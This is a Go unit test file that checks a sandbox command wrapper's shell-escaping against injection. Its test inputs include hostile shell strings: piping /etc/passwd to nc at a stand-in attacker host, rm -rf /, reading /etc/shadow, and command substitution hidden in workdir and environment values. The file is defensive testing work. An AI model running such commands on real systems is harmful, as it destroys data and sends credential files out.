package exec

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestShellEscape_PreventsCommandInjection(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple command",
			input:    "echo hello",
			expected: "'echo hello'",
		},
		{
			name:     "command with semicolon",
			input:    "ls; rm -rf /",
			expected: "'ls; rm -rf /'",
		},
		{
			name:     "command with backtick",
			input:    "echo `whoami`",
			expected: "'echo `whoami`'",
		},
		{
			name:     "command with pipe",
			input:    "cat /etc/passwd | nc attacker.com 1234",
			expected: "'cat /etc/passwd | nc attacker.com 1234'",
		},
		{
			name:     "command with dollar sign",
			input:    "echo $HOME",
			expected: "'echo $HOME'",
		},
		{
			name:     "command with newline",
			input:    "ls\ncat /etc/shadow",
			expected: "'ls\ncat /etc/shadow'",
		},
		{
			name:     "command with single quote",
			input:    "it's a test",
			expected: "'it'\\''s a test'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
		{
			name:     "command with exclamation mark",
			input:    "echo hello!",
			expected: "'echo hello!'",
		},
		{
			name:     "command with ampersand",
			input:    "echo hello&world",
			expected: "'echo hello&world'",
		},
		{
			name:     "command with parentheses",
			input:    "echo (test)",
			expected: "'echo (test)'",
		},
		{
			name:     "command with backslash",
			input:    "echo \\n",
			expected: "'echo \\n'",
		},
		{
			name:     "command with double quote",
			input:    `echo "hello"`,
			expected: `'echo "hello"'`,
		},
		{
			name:     "multiple single quotes",
			input:    "it's a 'test' here",
			expected: "'it'\\''s a '\\''test'\\'' here'",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := shellEscape(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestBuildCommand_SafeFromInjection(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	// 尝试注入攻击
	maliciousCmd := []string{"rm", "-rf", "/", ";", "nc", "attacker.com", "1234"}
	cmd := wrapper.BuildCommand(nil, "/workspace", maliciousCmd)

	// 验证命令被正确转义
	assert.Contains(t, cmd, "'rm'")
	assert.Contains(t, cmd, "'-rf'")
	assert.Contains(t, cmd, "'/'")
	assert.Contains(t, cmd, "';'")
	assert.Contains(t, cmd, "'nc'")
	// 所有参数都被单引号包裹，防止注入
}

func TestBuildCommand_WithMaliciousWorkdir(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	testCases := []struct {
		name     string
		workdir  string
		contains []string
	}{
		{
			name:    "workdir with semicolon injection",
			workdir: "/tmp; rm -rf /",
			contains: []string{
				"'/tmp; rm -rf /'",
			},
		},
		{
			name:    "workdir with backtick injection",
			workdir: "/tmp`whoami`",
			contains: []string{
				"'/tmp`whoami`'",
			},
		},
		{
			name:    "workdir with pipe injection",
			workdir: "/tmp | nc attacker.com 1234",
			contains: []string{
				"'/tmp | nc attacker.com 1234'",
			},
		},
		{
			name:    "workdir with newline injection",
			workdir: "/tmp\ncat /etc/shadow",
			contains: []string{
				"'/tmp\ncat /etc/shadow'",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := wrapper.BuildCommand(nil, tc.workdir, []string{"ls"})
			for _, expected := range tc.contains {
				assert.Contains(t, cmd, expected)
			}
		})
	}
}

func TestBuildCommand_WithMaliciousEnvValue(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	testCases := []struct {
		name      string
		env       map[string]string
		contains  []string
	}{
		{
			name: "env value with command substitution",
			env: map[string]string{
				"PATH": "/bin:$(whoami)",
			},
			contains: []string{
				"'/bin:$(whoami)'",
			},
		},
		{
			name: "env value with backtick",
			env: map[string]string{
				"TEST": "`rm -rf /`",
			},
			contains: []string{
				"'`rm -rf /`'",
			},
		},
		{
			name: "env value with pipe",
			env: map[string]string{
				"VAR": "value|nc attacker.com 1234",
			},
			contains: []string{
				"'value|nc attacker.com 1234'",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := wrapper.BuildCommand(tc.env, "/tmp", []string{"ls"})
			for _, expected := range tc.contains {
				assert.Contains(t, cmd, expected)
			}
		})
	}
}

func TestShellEscape_SecurityProperties(t *testing.T) {
	// Verify that escaped strings cannot break out of single quotes
	// when used in a shell command

	testCases := []struct {
		name  string
		input string
	}{
		{
			name:  "single quote escape attempt",
			input: "'",
		},
		{
			name:  "single quote in middle",
			input: "it's",
		},
		{
			name:  "multiple single quotes",
			input: "'a''b'",
		},
		{
			name:  "all special characters",
			input: ";|&$()`<>{}[]!~*?\\",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			escaped := shellEscape(tc.input)

			// The escaped string should start and end with single quotes
			assert.Equal(t, "'", escaped[0:1], "Escaped string should start with single quote")
			assert.Equal(t, "'", escaped[len(escaped)-1:], "Escaped string should end with single quote")

			// When properly escaped, there should be no unbalanced single quotes
			// (i.e., single quotes should always be paired as '\'')
			// This is a simplified check - the actual safety comes from the
			// fact that single quotes are closed and reopened properly
		})
	}
}

func TestEscapeForDoubleQuotes_PreservesVariables(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "dollar sign preserved",
			input:    "$HOME",
			expected: "$HOME",
		},
		{
			name:     "backtick preserved",
			input:    "`whoami`",
			expected: "`whoami`",
		},
		{
			name:     "double quote escaped",
			input:    `"hello"`,
			expected: `\"hello\"`,
		},
		{
			name:     "backslash escaped",
			input:    `\n`,
			expected: `\\n`,
		},
		{
			name:     "mixed special chars",
			input:    `echo "$HOME" && date`,
			expected: `echo \"$HOME\" && date`,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := escapeForDoubleQuotes(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}
